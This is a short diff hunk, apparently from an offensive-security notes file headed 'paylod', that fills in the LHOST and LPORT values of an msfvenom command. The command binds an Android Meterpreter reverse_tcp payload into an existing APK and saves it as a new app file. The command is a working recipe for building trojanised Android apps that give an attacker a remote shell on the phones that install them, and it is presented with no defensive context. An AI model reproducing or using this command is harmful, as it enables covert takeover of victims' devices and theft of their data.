@@ -3,7 +3,7 @@
 ## paylod:-
 
 
-msfvenom -x (bind apk name) -p android/meterpreter/reverse_tcp LHOST= LPORT= R > /sdcard/apk_name.apk
+msfvenom -x (bind apk name) -p android/meterpreter/reverse_tcp LHOST=(your ip) LPORT=4444 R > /sdcard/apk_name.apk
 
 
 
